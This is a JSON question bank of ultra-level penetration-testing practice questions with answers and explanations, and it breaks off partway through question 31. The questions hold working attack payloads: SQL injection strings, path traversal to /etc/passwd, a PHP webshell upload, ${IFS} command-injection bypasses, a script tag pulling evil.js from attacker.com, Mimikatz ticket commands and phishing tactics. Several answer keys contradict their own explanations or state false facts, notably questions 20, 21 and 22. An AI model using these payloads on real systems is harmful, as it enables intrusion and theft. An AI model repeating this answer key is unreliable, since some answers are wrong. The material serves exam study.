{
  "category": "penplus",
  "testId": 10,
  "testName": "Pentest Practice Test #10 (Ultra Level)",
  "xpPerCorrect": 10,
  "questions": [
    {
      "id": 1,
      "question": "During a code review, you encounter a function that uses `eval()` to execute a string constructed from user input and a database query result. The input is sanitized against SQL injection, but no other validation is performed. What's the MOST significant vulnerability?",
      "options": [
        "a) Cross-Site Scripting (XSS)",
        "b) Remote Code Execution (RCE)",
        "c) Server-Side Request Forgery (SSRF)",
        "d) SQL Injection"
      ],
      "correctAnswerIndex": 1,
      "explanation": "Sanitization focused solely on preventing database-related attacks is insufficient when dealing with dynamic code execution. Functions like `eval()` introduce a severe risk: if any part of the string passed to it can be influenced by user-provided data, even indirectly through database results, an attacker can inject and execute arbitrary code, leading to complete system compromise.",
      "examTip": "Avoid dynamic code execution functions (`eval()`, `exec()`, `system()`) whenever possible. If unavoidable, implement rigorous input validation and consider sandboxing or context restriction."
    },
    {
      "id": 2,
      "question": "You've compromised a web server and discovered a hidden directory containing backups of the application's source code. Within the backups, you find a file named `database.php.bak` containing hardcoded database credentials. However, the current `database.php` file uses environment variables. What's your MOST critical next step?",
      "options": [
        "a) Attempt to connect to the database using the hardcoded credentials found in the backup file.",
        "b) Report the finding as a critical vulnerability, highlighting the risk of credential exposure.",
        "c) Investigate the server's configuration and version control history to determine if and when the credentials were changed and whether they are still valid.",
        "d) Ignore the backup file, as the current configuration uses environment variables, which are considered more secure."
      ],
      "correctAnswerIndex": 2,
      "explanation": "The presence of hardcoded credentials in a backup file represents a historical vulnerability, but its current impact is unknown. Directly using those credentials without further investigation is premature. Dismissing the backup is incorrect. The crucial action is to determine the *timeline* of the credential change. Version control systems (if used) and server configuration history can reveal whether the old credentials are still active, potentially on other systems (development, staging) or if the database user's password was never updated.",
      "examTip": "Past configurations and backups often contain secrets that remain valid. Always correlate historical data with the current system state to uncover lingering vulnerabilities."
    },
    {
      "id": 3,
      "question": "You are assessing a network using Nmap. You run `nmap -sS -p- -T4 --min-rate 5000 <target>`. The scan takes an unusually long time and produces incomplete results. What is the MOST likely explanation?",
      "options": [
        "a) The target is offline.",
        "b) The target is heavily firewalled and is dropping packets.",
        "c) The `--min-rate` setting is too high, causing packet loss and overwhelming the target or network.",
        "d) The `-sS` (SYN scan) is being detected and blocked by an intrusion prevention system."
      ],
      "correctAnswerIndex": 2,
      "explanation": "While network defenses *could* cause delays, the specified minimum packet rate is exceptionally aggressive. Forcing a high packet rate can overwhelm network infrastructure, the target system, or even the scanning host itself, leading to packet loss and unreliable scan data. A completely unavailable target would produce *no* results, not incomplete ones. Intrusion prevention might block *some* traffic, but the described behavior points to self-inflicted issues due to excessive scan speed.",
      "examTip": "Aggressive Nmap scanning can be counterproductive. Carefully consider the network environment and adjust timing parameters to avoid overwhelming the target or causing inaccurate results."
    },
    {
      "id": 4,
      "question": "While reviewing firewall logs, you observe numerous dropped packets from your internal testing machine to a critical server on TCP port 443. You *know* the server is running a web application on that port. What is the MOST likely cause, assuming you are *not* attempting to evade the firewall?",
      "options": [
        "a) The web application is misconfigured.",
        "b) The server is experiencing a denial-of-service attack.",
        "c) A host-based firewall on the server is blocking the connection, or an ACL is misconfigured on an intermediary device.",
        "d) The network is experiencing high latency."
      ],
      "correctAnswerIndex": 2,
      "explanation": "Application misconfiguration would typically result in error responses, not dropped packets. While a denial-of-service attack is a possibility, it's less probable than a localized filtering issue, especially given the *internal* origin of the traffic. Network latency would cause delays, not outright packet drops. The most probable scenario is a restrictive configuration on the *target server itself* (using a host-based firewall) or a misconfigured access control list on a network device along the communication path.",
      "examTip": "Troubleshooting connectivity failures requires examining *all* potential points of control, including host-based firewalls and network device access lists, not just perimeter defenses."
    },
    {
      "id": 5,
      "question": "You're performing a penetration test against a web application that uses a custom token-based authentication system. After successfully logging in, you notice that the token is a long, seemingly random string appended to every request as a URL parameter. You change one character in the token and receive a '403 Forbidden' error. Changing multiple characters results in the same error. What is the LEAST likely explanation for this behavior?",
      "options": [
        "a) The token is cryptographically signed, and any modification invalidates the signature.",
        "b) The token includes a checksum or hash, and the server validates it on each request.",
        "c) The token is randomly generated and checked against a database of valid tokens.",
        "d) The token is simply an identifier, and changing it causes the server to look up a non-existent session."
      ],
      "correctAnswerIndex": 3,
      "explanation": "Cryptographic signatures and checksums are specifically designed to detect tampering, making them very likely explanations for the observed behavior. If the token were merely a session identifier, a random alteration *might* occasionally correspond to another valid session, leading to unpredictable results, not a consistent error. The consistent '403 Forbidden' response to *any* modification strongly suggests the presence of an integrity check.",
      "examTip": "Consistent error responses to minor alterations in authentication tokens are a strong indication of integrity verification mechanisms like signatures or hashes."
    },
    {
      "id": 6,
      "question": "During a physical security assessment, you successfully clone an employee's RFID badge. However, when you attempt to use the cloned badge, the door remains locked, and an alarm is triggered. What is the MOST probable cause, assuming the cloning process itself was successful?",
      "options": [
        "a) The RFID reader is faulty.",
        "b) The cloned badge has insufficient power.",
        "c) The access control system uses a time-based or sequence-based anti-cloning mechanism.",
        "d) The original badge has been deactivated."
      ],
      "correctAnswerIndex": 2,
      "explanation": "A malfunctioning reader or a deactivated badge would likely result in *no* response, not an alarm. Insufficient power would also likely prevent any response. The activation of an alarm indicates an active security measure. Modern access control systems often implement anti-cloning techniques that go beyond simply verifying the badge ID. These can include tracking the order of badge uses or enforcing time restrictions. A cloned badge, even with a valid ID, would violate these rules and trigger an alert.",
      "examTip": "Sophisticated physical access controls often incorporate anti-cloning defenses. Be prepared for systems that track badge usage patterns or time windows."
    },
    {
      "id": 7,
      "question": "You're analyzing a captured network packet containing an HTTP request. The request includes a `User-Agent` string: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 MyCustomBrowser/1.0`. What can you MOST reliably infer from this?",
      "options":[
          "a) The request originated from a Windows 10 machine.",
          "b) The request was made using Google Chrome.",
          "c) The request was made using a custom browser built on Chromium.",
          "d) The User-Agent string has been spoofed."
      ],
      "correctAnswerIndex": 2,
      "explanation": "While the `User-Agent` *suggests* a specific operating system and browser, these fields are easily manipulated. The presence of `MyCustomBrowser/1.0` is the most definitive information. This string indicates that the request originated from a custom-built browser, and the other components of the `User-Agent` strongly suggest it's based on the Chromium engine. While spoofing is always *possible*, the presence of the custom browser identifier is the most reliable deduction.",
      "examTip": "The `User-Agent` header is easily forged. Look for inconsistencies and custom browser identifiers to detect potential spoofing or identify custom-built clients."
    },
    {
        "id": 8,
        "question": "You are investigating a potential SQL injection vulnerability in a web application. You inject the following payload into a search field: `' OR 1=1--`. The application returns all records, suggesting a successful injection. You then try: `' OR 1=0--`. This also returns all records. What is the MOST likely explanation?",
        "options": [
          "a) The application is vulnerable to blind SQL injection.",
          "b) The application is filtering single quotes.",
          "c) The application is using a prepared statement.",
          "d) The application's WHERE clause already evaluates to true, making your injected condition irrelevant."
        ],
        "correctAnswerIndex": 3,
      "explanation": "If the application were filtering single quotes, the initial injection attempt would not have succeeded. Blind SQL injection techniques would not typically result in the immediate retrieval of *all* records. Prepared statements, if properly implemented, would prevent the injection altogether. The most probable scenario is that the original SQL query's `WHERE` clause is inherently true for all records (e.g., `WHERE 1=1` or `WHERE status='active'`). Consequently, the injected `OR` conditions have no effect on the query's outcome. The underlying issue is flawed query logic, not necessarily a lack of injection protection.",
      "examTip": "When analyzing SQL injection results, always consider the structure of the *original* query. Unexpected behavior can be caused by a flawed `WHERE` clause, not necessarily a failed injection attempt."
    },
        {
        "id": 9,
        "question": "You are analyzing a memory dump of a compromised Linux server. You use the `strings` command and find a long, Base64-encoded string. After decoding it, you find another Base64-encoded string. After decoding *that*, you find a compressed archive. What is the MOST appropriate next step?",
        "options": [
          "a) Immediately report the finding as evidence of malware.",
          "b) Extract the archive and analyze its contents.",
          "c) Attempt to execute the extracted archive on a sandboxed system.",
          "d) Discard the finding, as nested encoding and compression indicate a false positive."
        ],
        "correctAnswerIndex": 1,
      "explanation": "Premature reporting without further analysis is not the best approach.  Direct execution, even in a sandbox, is too risky *before* understanding the contents. Dismissing the finding is incorrect; layered encoding and compression are common techniques used by malware to conceal its payload and evade detection. The appropriate action is to *extract* the archive (within a controlled environment) and then meticulously examine its contents (using tools like `strings`, `file`, disassemblers) *before* any attempt at execution.",
      "examTip": "Malware frequently employs multiple layers of encoding and compression. Careful, staged analysis is essential for understanding the threat."
    },
    {
      "id": 10,
       "question": "You are conducting a penetration test on a web application and find a vulnerable endpoint that allows you to upload files. However the application is protected by WAF, what technique bypasses WAF?",
        "options":[
            "a) Upload a webshell.",
            "b) Change the content type of the uploaded file.",
            "c) Enclose the uploaded file in a zip archive.",
            "d) Upload a file in another language."
        ],
        "correctAnswerIndex": 1,
        "explanation":"Web Application Firewalls often inspect HTTP headers, including the declared content type. If the application anticipates a specific type, such as an image, but receives a script with a matching, yet deceptive, content type declaration, the firewall may be circumvented. The firewall focuses on the declared type, while the malicious content is executed upon delivery.",
        "examTip": "Examine how applications process various content types and whether discrepancies between declared and actual content can be leveraged to bypass security measures."
    },
    {
      "id": 11,
      "question": "During a wireless penetration test, you've successfully captured a four-way handshake from a WPA2-PSK network. You've also obtained a large, curated password list known to contain common passwords used by the target organization. Despite running `aircrack-ng` with this list for several hours, the handshake remains uncracked. What is the *LEAST* likely reason?",
      "options": [
        "a) The correct password is not in the wordlist.",
        "b) The network uses WPA3, not WPA2-PSK.",
        "c) The capture file is corrupted.",
        "d) The access point uses a hidden SSID."
      ],
      "correctAnswerIndex": 3,
      "explanation": "The absence of the correct password within the provided wordlist is a frequent cause of cracking failures. A different handshake mechanism would be used by WPA3. Corruption of the capture file could certainly prevent successful cracking. The visibility or concealment of the SSID does *not* influence the cracking process itself. The SSID is contained within the handshake (in a hashed form), and tools like `aircrack-ng` are designed to handle hidden SSIDs.",
      "examTip": "Hidden SSIDs provide only a superficial layer of security and do not significantly hinder WPA2-PSK cracking efforts."
    },
    {
      "id": 12,
      "question": "You've gained access to a Windows system and are attempting to escalate privileges. You run `whoami /groups` and discover the user is a member of the 'Backup Operators' group. What is the MOST efficient and reliable method to leverage this for privilege escalation?",
      "options": [
        "a) Use `robocopy` to copy sensitive files from restricted directories.",
        "b) Modify the system's backup schedule to include arbitrary commands.",
        "c) Use `wbadmin` to create a system state backup, extract the SAM and SYSTEM hives, and crack user passwords.",
        "d) Overwrite critical system files with older, vulnerable versions from a backup."
      ],
      "correctAnswerIndex": 2,
      "explanation": "Copying files with tools like `robocopy` grants access to data but doesn't directly lead to privilege *escalation*. Tampering with the backup schedule is unreliable and may not provide immediate control. Replacing system files is destructive and easily detected. Membership in the 'Backup Operators' group grants the ability to *bypass* file system permissions and *read* any file. The most effective approach is to create a backup of the SAM and SYSTEM hives (which contain password hashes), extract them, and then perform offline password cracking. This provides direct access to user credentials, including those of administrator accounts.",
      "examTip": "Windows 'Backup Operators' group membership is a significant privilege escalation vector because it allows bypassing file system ACLs."
    },
    {
    "id": 13,
    "question": "You've successfully exploited a web application vulnerability and obtained a reverse shell on a Linux server. However, the shell is non-interactive and limited. You want to upgrade to a fully interactive TTY. Which of the following techniques is MOST likely to succeed *and* leave the smallest footprint?",
    "options": [
        "a) Use `nc` to create a new reverse shell connection.",
        "b) Use `python -c 'import pty; pty.spawn(\"/bin/bash\")'`.",
        "c) Upload a custom-compiled reverse shell binary.",
        "d) Use `socat` to create a bidirectional communication channel."
    ],
    "correctAnswerIndex": 1,
    "explanation": "Establishing a *new* connection with `nc` does not improve the existing, limited shell. Introducing a custom binary leaves a significant trace. While `socat` is powerful, it's not always present on default installations. The Python `pty.spawn()` method is both reliable and stealthy. It uses Python's built-in `pty` module (commonly available on Linux systems) to create a pseudo-terminal, effectively transforming the shell into a fully interactive TTY *without* requiring external tools or additional connections.",
    "examTip": "The Python `pty.spawn()` technique is a critical skill for upgrading limited shells to fully interactive TTYs on Linux."
    },
    {
        "id": 14,
        "question": "You are performing a vulnerability scan using Nessus. You configure the scan with valid administrative credentials for the target Windows systems. However, the scan results show significantly fewer vulnerabilities than expected. What is the MOST likely reason, *other than* the systems being fully patched?",
        "options": [
            "a) The scan policy is misconfigured.",
            "b) The target systems are running a non-standard operating system.",
            "c) The Nessus scanner is outdated.",
            "d) Remote Registry service is disabled or firewalled on the target systems."
        ],
        "correctAnswerIndex": 3,
        "explanation": "While policy misconfiguration or an outdated scanner could contribute, they are less probable causes than issues with a core service. For *credentialed* Windows scans, Nessus heavily depends on the Remote Registry service to collect detailed information about installed software, configurations, and vulnerabilities. If this service is disabled or blocked by firewall rules, Nessus cannot perform many of its checks, leading to a significantly reduced number of reported vulnerabilities. The operating system being non-standard wouldn't be relevant *with* credentials.",
        "examTip": "Ensure the Remote Registry service is enabled and accessible for accurate credentialed vulnerability scans on Windows."
    },
    {
      "id": 15,
      "question": "You are analyzing a web application that uses JSON Web Tokens (JWT) for authentication. You obtain a JWT and decode the header, which shows the following: `{\"alg\": \"none\", \"typ\": \"JWT\"}`. What is the IMMEDIATE security implication?",
      "options":[
        "a) The token is encrypted.",
        "b) The token is using a weak signing algorithm.",
        "c) The token is not signed, allowing for trivial forgery.",
        "d) The token is expired."
      ],
      "correctAnswerIndex": 2,
      "explanation": "The presence of `alg: none` in the JWT header indicates the *absence* of a digital signature. This constitutes a critical security flaw. An attacker can modify the JWT's payload, re-encode it, and the server (if it accepts `alg: none`) will consider it a valid token. This enables trivial forgery and complete circumvention of the authentication mechanism. Encryption is not relevant to the `alg` field, and expiration is a separate concern.",
      "examTip": "Always examine the `alg` field in JWT headers. `alg: none` represents a critical vulnerability and should never be accepted by a properly configured server."
    },
    {
    "id": 16,
    "question": "You're performing a social engineering engagement. You've crafted a convincing phishing email impersonating a senior executive. Which of the following factors, *combined*, would MOST likely increase the success rate of your campaign?",
    "options": [
        "a) Sending the email during business hours and using a generic subject line.",
        "b) Sending the email from a free email provider (e.g., Gmail) and including a link to a well-known website.",
        "c) Sending the email outside of business hours and using a subject line that conveys urgency and authority.",
        "d) Sending the email from a spoofed email address resembling the executive's domain, using a subject line that conveys urgency and authority, and including a link to a newly registered domain that mimics a legitimate company resource."
    ],
    "correctAnswerIndex": 3,
    "explanation": "Generic subjects and sending emails during typical work hours reduce the sense of urgency. Using a free email provider and linking to a familiar website is less suspicious but also less compelling. While sending *outside* business hours can *increase* urgency, the combination of a spoofed sender address (mimicking the executive's domain), a subject line designed to create a sense of immediate action and importance, and a *plausibly malicious* link (a newly registered domain that resembles a legitimate company resource) is most likely to succeed.  This combines technical deception with psychological manipulation.",
    "examTip": "Effective phishing combines multiple psychological triggers (urgency, authority, fear) with technical techniques (spoofing, realistic-looking links) to maximize the chance of user compromise."
    },
    {
      "id": 17,
       "question": "You're analyzing a captured pcap file from a suspected malware infection. You notice a large number of DNS requests to seemingly random, long subdomains of a single domain (e.g., `asdfhjklqwertyuiop.example.com`, `zxcvbnmasdfghjkl.example.com`). What is the MOST likely explanation?",
      "options":[
          "a) The infected host is performing DNS lookups for legitimate services.",
          "b) The network is experiencing a DNS misconfiguration.",
          "c) The infected host is using DNS tunneling for data exfiltration or command and control.",
          "d) The pcap file is corrupted."
      ],
      "correctAnswerIndex": 2,
      "explanation":"Legitimate services rarely utilize numerous, randomly generated subdomains. A DNS misconfiguration would more likely result in resolution failures than a flood of requests to nonsensical subdomains. File corruption is less probable than the correct explanation. This pattern—a high volume of requests to lengthy, seemingly random subdomains—is a strong indicator of DNS tunneling. Malware employs this technique to encode data within DNS queries, bypassing firewalls that often permit DNS traffic, thus facilitating data exfiltration or communication with a command-and-control server.",
      "examTip": "Be highly alert to DNS traffic exhibiting numerous requests to long, random-appearing subdomains, as this is a hallmark of DNS tunneling."
    },
    {
        "id": 18,
        "question": "You've discovered a web application that allows users to upload SVG files. The application displays the uploaded SVGs directly in the browser. What is the PRIMARY security concern?",
        "options": [
            "a) Denial of Service (DoS)",
            "b) Cross-Site Scripting (XSS)",
            "c) Remote Code Execution (RCE)",
            "d) File Inclusion"
        ],
        "correctAnswerIndex": 1,
        "explanation": "While excessively large files *could* potentially lead to a denial-of-service, it's not the most immediate threat. Remote code execution and file inclusion are less probable with SVG files. The predominant risk is cross-site scripting. SVG, being an XML-based format, *can include embedded JavaScript*. If the application fails to properly sanitize uploaded SVG content, an attacker can inject malicious JavaScript code that will be executed in the context of other users' browsers when they view the image, leading to session hijacking, data theft, or other XSS-related attacks.",
        "examTip": "SVG files, because they are XML-based and can contain scripts, are a significant vector for Cross-Site Scripting (XSS) attacks. Always sanitize SVG uploads."
    },
        {
            "id": 19,
            "question": "You're performing a black-box penetration test against a web application. You identify a login form. After several failed login attempts with invalid usernames, the application returns a generic 'Invalid username or password' message. However, when you enter a *known* valid username with an incorrect password, the response time is significantly longer. What vulnerability does this behavior MOST likely indicate?",
            "options": [
                "a) SQL Injection",
                "b) Cross-Site Scripting (XSS)",
                "c) Username Enumeration",
                "d) Brute-Force Protection"
            ],
            "correctAnswerIndex": 2,
            "explanation": "The observed difference in response times provides information about the *username*, not the password itself. This is a classic example of username enumeration. The application likely performs a check on the username *first*, and if it's valid, proceeds to a (more time-consuming) password verification step. This allows an attacker to create a list of valid usernames, which can then be used in targeted password attacks. It's not indicative of SQL injection or XSS. It suggests a *deficiency* in brute-force protection that should *conceal* the validity of the username.",
            "examTip": "Variations in authentication response times can leak information about the validity of usernames or passwords, indicating a username enumeration vulnerability."
        },
        {
          "id": 20,
          "question": "You are using `tcpdump` to capture network traffic on an interface. You want to capture *only* traffic to or from a specific IP address (192.168.1.100) and on port 80. Which of the following `tcpdump` commands is the MOST efficient and correct?",
          "options":[
              "a) `tcpdump -i any host 192.168.1.100 and port 80`",
              "b) `tcpdump -i eth0 src 192.168.1.100 or dst 192.168.1.100 and port 80`",
              "c) `tcpdump -i eth0 'host 192.168.1.100 and port 80'`",
              "d) `tcpdump -i eth0 'ip host 192.168.1.100 and tcp port 80'`"
          ],
          "correctAnswerIndex": 3,
          "explanation": "Capturing on 'any' interface can introduce unnecessary overhead. Specifying source *or* destination is less precise than capturing traffic *to or from* the target. Using 'ip host' and 'tcp port' provides a highly specific Berkeley Packet Filter (BPF), but the most concise and efficient BPF syntax for this task is simply 'host' and 'port', enclosed in single quotes to create a single filter expression.",
          "examTip": "Proficiency in `tcpdump`'s BPF syntax is essential for efficient and targeted network traffic capture. Enclose complex filter expressions in single quotes."
        },
    {
        "id": 21,
        "question": "You are analyzing a web application and discover that it's vulnerable to Local File Inclusion (LFI) but *not* Remote File Inclusion (RFI). You can successfully read `/etc/passwd` using a specific URL. However, attempts to include remote files fail. What technique is MOST likely to allow you to achieve code execution despite the lack of RFI?",
        "options": [
            "a) Use a PHP wrapper like `php://filter` to encode and exfiltrate local files.",
            "b) Attempt to upload a malicious file to a writable directory and then include it using the LFI vulnerability.",
            "c) Use the LFI to read sensitive configuration files and find database credentials.",
            "d) Exploit a different vulnerability, as code execution is impossible without RFI."
        ],
        "correctAnswerIndex": 1,
        "explanation": "While retrieving configuration files can be valuable, it doesn't directly result in code execution.  Relying on a separate file upload vulnerability is a multi-step process and not always feasible. Giving up on code execution is premature.  The key lies in leveraging PHP wrappers, specifically `php://filter`. This powerful feature allows for reading files, *including PHP files*, and potentially encoding their output. Critically, if a method exists to *write* to a file on the server (even seemingly innocuous files like logs), PHP code can be injected.  Then, by using the `php://filter` with decoding capabilities, the injected code can be executed, achieving RCE *through* LFI, even without direct RFI functionality.",
        "examTip": "The `php://filter` wrapper is a powerful tool for exploiting LFI, enabling not only file reading and encoding, but also potential code execution when combined with a write vector."
    },
    {
        "id": 22,
        "question": "You're conducting a penetration test against a web application that utilizes a Content Security Policy (CSP). The CSP header is set to: `Content-Security-Policy: default-src 'self'; script-src 'self' cdn.example.com; img-src *;`. Which of the following XSS attacks is MOST likely to bypass this CSP?",
        "options": [
            "a) Injecting an inline script tag: `<script>alert(1);</script>`",
            "b) Injecting a script tag referencing a malicious script hosted on your own server: `<script src=\"http://attacker.com/evil.js\"></script>`",
            "c) Injecting an inline script tag within an SVG image: `<svg><script>alert(1);</script></svg>`",
            "d) Injecting a script tag referencing a malicious script hosted on `cdn.example.com`: `<script src=\"https://cdn.example.com/evil.js\"></script>`"
        ],
        "correctAnswerIndex": 2,
        "explanation": "The policy explicitly blocks inline scripts due to `script-src 'self'`. Scripts from external sources are restricted to a specific, trusted CDN. While compromising the allowed CDN is a *possibility*, it's a significantly more complex attack. The policy permits images from *any* source. Critically, it *doesn't* prevent inline scripts embedded *within* SVG images. This oversight is a common CSP bypass. The browser will execute the script contained within the SVG, even though general inline scripts are prohibited.",
        "examTip": "Content Security Policies can be intricate. Carefully analyze the permitted sources for each directive and search for potential bypasses, particularly involving inline scripts within seemingly unrestricted contexts like SVG images."
    },
    {
    "id": 23,
    "question": "You are performing a penetration test on a Linux server. You've obtained a low-privilege shell and discover a setuid binary owned by root located in a user's home directory. When you run the binary, it appears to do nothing. What should be your FIRST step in attempting to exploit this?",
    "options":[
      "a) Run the binary with strace to understand system calls",
      "b) Run the binary with ltrace to track library function calls.",
      "c) Use a disassembler like Ghidra or IDA Pro to analyze the binary's code.",
      "d) Attempt to find known vulnerabilities for the binary using SearchSploit."
    ],
    "correctAnswerIndex": 0,
    "explanation": "While static analysis with a disassembler or searching for known exploits might be necessary later, they are relatively time-consuming initial steps. Tracing library calls is less informative for setuid binaries, as vulnerabilities often reside in the binary's *own* code, not library interactions. The most immediate and insightful first step is to use `strace`. This reveals the *system calls* the binary is making. Setuid binaries frequently have vulnerabilities in how they handle input, environment variables, or file paths. `strace` will expose these interactions, providing immediate clues for potential exploitation.",
    "examTip": "For setuid binaries on Linux, `strace` is often the most effective initial tool to understand the program's behavior and identify potential vulnerabilities at the system call level."
  },
  {
    "id": 24,
      "question": "You have obtained a Kerberos Ticket Granting Ticket (TGT) for a user on a Windows domain. You want to request a service ticket for the CIFS service (file sharing) on a specific server (fileserver.example.com). Which of the following commands, using Mimikatz, is MOST likely to achieve this?",
    "options":[
      "a) `kerberos::tgt /user:username /domain:example.com /ticket:TGT_BASE64`",
      "b) `kerberos::ptt /ticket:TGT_BASE64`",
      "c) `kerberos::ask /target:fileserver.example.com /service:cifs /ticket:TGT_BASE64`",
      "d) `sekurlsa::tickets /export`"
    ],
    "correctAnswerIndex": 2,
    "explanation":"Simply displaying TGT information is not the goal. Importing the TGT into the current session is a separate action. Exporting *all* tickets is unnecessarily broad and increases the risk of detection. The specific command within Mimikatz's `kerberos` module designed for requesting *service tickets* is `kerberos::ask`. This command allows specifying the target server, the desired service (in this case, CIFS for file sharing), and the TGT to be used for the authentication request.",
    "examTip": "Familiarity with Mimikatz's `kerberos` module is crucial for Kerberos-based attacks. Use `kerberos::ask` to request service tickets, providing a TGT."
  },
{
    "id": 25,
    "question": "You are tasked with exploiting a custom-built cryptographic protocol used for authentication. During your analysis, you observe that the protocol utilizes a 24-bit initialization vector (IV) in conjunction with AES-CBC mode. The IV is generated sequentially and predictably.  Which attack is MOST feasible and effective given this weakness?",
    "options":[
        "a) Brute-force attack on the encryption key.",
        "b) Known-plaintext attack.",
        "c) Chosen-ciphertext attack.",
        "d)  IV reuse/prediction attack."
    ],
    "correctAnswerIndex": 3,
    "explanation": "Brute-forcing AES, even with a reduced key space, is computationally infeasible.  A known-plaintext attack could *eventually* work, but is less efficient.  A chosen-ciphertext attack is generally complex. The *predictable* 24-bit IV is the critical weakness.  With a small, predictable IV space, an attacker can anticipate future IVs.  If the same key is used with a repeated or predictable IV, the encryption becomes vulnerable.  The attacker can leverage this to decrypt traffic or potentially forge valid ciphertexts, especially if they can influence some of the plaintext.",
    "examTip": "Small, predictable, or reused Initialization Vectors (IVs) are a critical weakness in block cipher modes like CBC, enabling various attacks, including decryption and forgery."
},
    {
      "id": 26,
      "question": "You are attacking a web application and discover a Server-Side Request Forgery (SSRF) vulnerability. The application makes requests to an internal API based on user-supplied URLs. However, a strict input validation filter blocks requests to common internal IP addresses (127.0.0.1, 192.168.x.x, 10.x.x.x, 172.16.x.x-172.31.x.x) and their decimal/octal equivalents. Which of the following techniques is MOST likely to bypass this filter and access a service running on the loopback interface?",
      "options": [
        "a) Use a publicly accessible URL.",
        "b) Use a URL that redirects to an internal IP address.",
        "c) Use a DNS name that resolves to an internal IP address, utilizing a service like xip.io.",
        "d) Use the IPv6 loopback address (::1) encoded in a non-standard way."
      ],
      "correctAnswerIndex": 3,
      "explanation": "Using a public URL defeats the purpose of SSRF.  Redirection might work but relies on the server following redirects and not filtering the redirect target. Using a DNS name with services like xip.io is useful for bypassing filters targeting *specific IP ranges*, but the filter explicitly blocks *equivalents* of loopback. The most likely bypass involves leveraging the IPv6 loopback address (`::1`) *and* encoding it in an unconventional way. Many filters are designed for IPv4 and may not correctly handle all IPv6 representations. For example, `[::1]` or `0:0:0:0:0:0:0:1` might bypass the filter.",
      "examTip": "When bypassing SSRF filters, consider alternative IP address representations, especially less common IPv6 forms and encodings that might not be handled correctly by the filter."
    },
    {
      "id": 27,
      "question": "You are analyzing a web application and discover the following PHP code snippet: `$filename = $_GET['file']; include('/var/www/uploads/' . $filename);`. The application is running on a Linux system.  Which of the following payloads, provided via the `file` parameter, is MOST likely to allow you to read the contents of the `/etc/passwd` file, *and why*?",
      "options": [
        "a) `file=../../../../etc/passwd`",
        "b) `file=/etc/passwd`",
        "c) `file=php://filter/read=convert.base64-encode/resource=/etc/passwd`",
        "d) `file=....//....//....//....//etc/passwd`"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Providing the absolute path (`/etc/passwd`) directly won't work because the code prepends `/var/www/uploads/`. The `php://filter` is powerful, but it's unnecessary for *simply reading* a file when path traversal is possible. The `....//` trick works on *some* systems with flawed path normalization, but is less reliable than standard path traversal. The correct payload is `../../../../etc/passwd`. This uses relative path traversal to navigate *up* from the `/var/www/uploads/` directory, eventually reaching the root directory and then accessing `/etc/passwd`.",
      "examTip": "For basic LFI via path traversal, use relative paths (`../`) to navigate the directory structure effectively. Understand the context (prepended paths) to craft the correct traversal sequence."
    },
    {
    "id": 28,
    "question": "Examine the following Apache web server log entry:\n`192.168.1.100 - - [10/Oct/2024:13:37:00 +0000] \"GET /index.php?id=1' UNION SELECT 1,@@version,3-- HTTP/1.1\" 200 567 \"-\" \"Mozilla/5.0 ...\"`\nWhat type of attack is MOST likely being attempted, and what specific information is the attacker likely trying to retrieve?",
    "options":[
        "a) XSS, attempting to inject JavaScript.",
        "b) SQL Injection, attempting to retrieve the database version.",
        "c) Command Injection, attempting to execute OS commands.",
        "d) Directory Traversal, attempting to access files outside the webroot."
    ],
    "correctAnswerIndex": 1,
    "explanation": "The log entry clearly shows a `UNION SELECT` statement within the `id` parameter of a GET request. This is a hallmark of SQL injection. The attacker is injecting SQL code to combine the results of their query with the original query.  Specifically, `@@version` is a MySQL (and MariaDB) variable that contains the database server's version string.  This is a common first step in SQL injection to identify the database type and version.",
    "examTip": "In web server logs, look for SQL keywords (SELECT, UNION, WHERE, etc.) within URL parameters as strong indicators of SQL injection attempts."
    },
{
      "id": 29,
      "question": "You are performing a penetration test on a web application. You've identified a potential file upload vulnerability. Analyze the following HTTP request:\n```\nPOST /upload.php HTTP/1.1\nHost: example.com\nContent-Length: 250\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW\n\n------WebKitFormBoundary7MA4YWxkTrZu0gW\nContent-Disposition: form-data; name=\"file\"; filename=\"image.jpg\"\nContent-Type: image/jpeg\n\nGIF89a...\n<?php phpinfo(); ?>\n------WebKitFormBoundary7MA4YWxkTrZu0gW--\n```\nWhat is the MOST significant vulnerability being tested, and what is a potential bypass technique that could be used if the server only checks the `filename` extension?",
      "options":[
          "a) XSS, attempting to inject a GIF file",
          "b) Unrestricted File Upload, changing the filename to shell.php",
          "c) Unrestricted File Upload, changing the Content-Type to `application/x-php` and the filename to `shell.php`.",
        "d) Unrestricted file upload, Double extensions"
      ],
      "correctAnswerIndex": 3,
      "explanation": "The request shows an attempt to upload a file. While the `filename` is `image.jpg`, the *content* contains PHP code (`<?php phpinfo(); ?>`). This strongly suggests an attempt to exploit an unrestricted file upload vulnerability to upload a webshell. If the server *only* checks the filename extension and ignores the `Content-Type` *and* the actual file content, a potential bypass would be to use a *double extension* (e.g., `shell.php.jpg`). Some web servers, if misconfigured, will execute the file as PHP based on the first extension (`.php`) while still passing the filename extension check (expecting `.jpg`).",
      "examTip": "When testing file upload vulnerabilities, always consider bypass techniques, such as double extensions, null byte injection, and manipulating the `Content-Type` header."
    },
    {
        "id": 30,
        "question": "You have gained access to a Linux server and find a Python script running as a cron job. The script contains the following line: `os.system(\"cat \" + logfile)`.  The `logfile` variable is defined earlier in the script and is constructed using user-controlled input from a web form, but the input is sanitized to remove spaces.  What is the MOST effective way to exploit this to achieve command injection?",
        "options": [
            "a) Use a standard command injection payload with spaces.",
            "b) Use a payload that includes a semicolon (`;`) to separate commands.",
            "c) Use a payload that leverages Bash command substitution without spaces, such as `${IFS}&&${IFS}id`.",
            "d) It is not exploitable, since spaces are removed."
        ],
        "correctAnswerIndex": 2,
        "explanation": "Spaces being removed prevents *basic* command injection.  Semicolons would normally work, but the `cat` command itself requires a space *after* it.  The key is to use Bash features that don't require *literal* spaces. `${IFS}` represents the Internal Field Separator (which defaults to space, tab, and newline). `&&` is a command separator that executes the second command only if the first succeeds.  Therefore, `${IFS}&&${IFS}id` effectively becomes ` && id`, bypassing the space restriction and executing the `id` command.",
        "examTip": "When facing input sanitization, explore alternative shell syntax. `${IFS}` is a powerful technique for bypassing space restrictions in command injection on Linux systems."
    },
    {
      "id": 31,
      "question": "You're reviewing a web application's JavaScript code and find the following snippet: `window.location.href = document.location.hash.substring(1);`.  What type of vulnerability does this code MOST likely introduce, and what is a potential exploit payload?",
